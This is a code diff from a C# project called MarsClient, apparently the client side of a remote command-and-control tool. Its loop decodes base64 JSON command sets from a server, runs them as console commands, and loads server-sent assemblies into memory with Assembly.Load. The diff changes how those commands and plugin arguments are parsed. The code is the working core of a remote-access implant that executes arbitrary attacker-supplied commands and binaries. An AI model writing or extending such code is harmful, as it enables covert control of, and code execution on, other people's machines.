@@ -8,6 +8,7 @@ using System.Reflection;
 using System.Runtime;
 using System.IO;
 using System.Text;
+using System.Text.Json;
 using System.Web;
 using MarsClient.Plugins;
 
@@ -156,25 +157,29 @@ namespace MarsClient
                 // parse body json into a object
                 // c# got mad when there was no class to pass this into
                 // i now realize i could have used a base class lol
-                CommandSet commandSet = System.Text.Json.JsonSerializer.Deserialize<CommandSet>(Base64DecodeString(body));
+                CommandSet commandSet = JsonSerializer.Deserialize<CommandSet>(Base64DecodeString(body));
                 
                 // console log the command set for testing
-                //Console.WriteLine($"Command set recieved: {commandSet.commands}");
 
                 // execute commands
                 
                 // don't pass another shell to this command shell!!!
-                foreach(string[] command in commandSet.commands){
+                foreach(dynamic[] command in commandSet.commands){
                     string result = "";
-                    if (command[1] == "console"){
-                        result = await ConsoleCommand(command[0]);
-                    } else if (command[1] == "plugin") {
+                    string file = command[0].ToString();
+                    string type = command[1].ToString();
+
+                    if (type == "console"){
+                        result = await ConsoleCommand(file);
+                    } else if (type == "plugin") {
                         //the null here should be the parameters passed to the plugin that is being run
                         //result = PluginCommand(command[0], null);
-                        if (2 < command.Length){
-                            result = RunPluginCommandFromBase64(command[0], null, new[]{command[2]});
-                        } else {
-                            result = RunPluginCommandFromBase64(command[0], null, null);
+                        //if (2 < command.Length){
+                        try{
+                            string[] commands = JsonSerializer.Deserialize<string[]>(command[2]);
+                            result = RunPluginCommandFromBase64(file, null, commands);
+                        } catch (Microsoft.CSharp.RuntimeBinder.RuntimeBinderException) {
+                            result = RunPluginCommandFromBase64(file, null, null);
                         }
                     } else {
                         result = "Failed";
@@ -192,7 +197,6 @@ namespace MarsClient
             //saves a file transfered from the server
             //should take real commands to run with real plugins
             //that are loaded with assembly from a dll
-            //legacy 
             Assembly asm = Assembly.Load(Base64DecodeFile(command));
             /*
             * this should search through all classes to find the Main or other starting method
@@ -324,7 +328,7 @@ namespace MarsClient
     // class to hold command set
     public class CommandSet
     {
-        public LinkedList<String[]> commands {get; set;}
+        public LinkedList<dynamic[]> commands {get; set;}
     }
 
 }
